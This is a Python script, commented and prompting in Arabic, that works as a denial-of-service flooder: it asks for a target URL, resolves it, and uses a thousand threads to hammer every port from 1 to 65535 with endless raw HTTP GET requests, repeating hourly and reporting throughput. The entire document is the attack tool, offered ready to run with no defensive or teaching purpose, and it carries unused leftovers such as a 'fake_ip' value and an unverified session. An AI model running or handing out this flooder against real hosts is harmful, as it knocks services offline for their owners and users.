import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
import socket

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

def attack(ip, port):
    global bytes_transferred
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            message = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
            sock.send(message)
            response = sock.recv(4096)
            with lock:
                bytes_transferred += len(response)
            print(f"تم إرسال الطلب إلى: {ip}:{port}")
            sock.close()
        except Exception as e:
            print(f"حدث خطأ على {ip}:{port}:", e)

def start_attack(ip):
    ports = list(range(1, 65536))  # جميع المنافذ الممكنة من 1 إلى 65535
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for port in ports:
            executor.submit(attack, ip, port)

def calculate_speed():
    global bytes_transferred
    while True:
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميجابايت
            bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

url = input("أدخل رابط الهدف: ")
ip = socket.gethostbyname(url.split('//')[-1].split('/')[0])

print("بدء الهجوم بشكل مستمر على مدار 24 ساعة")

# بدء خيط حساب السرعة
speed_thread = threading.Thread(target=calculate_speed)
speed_thread.daemon = True
speed_thread.start()

while True:
    start_attack(ip)
    time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
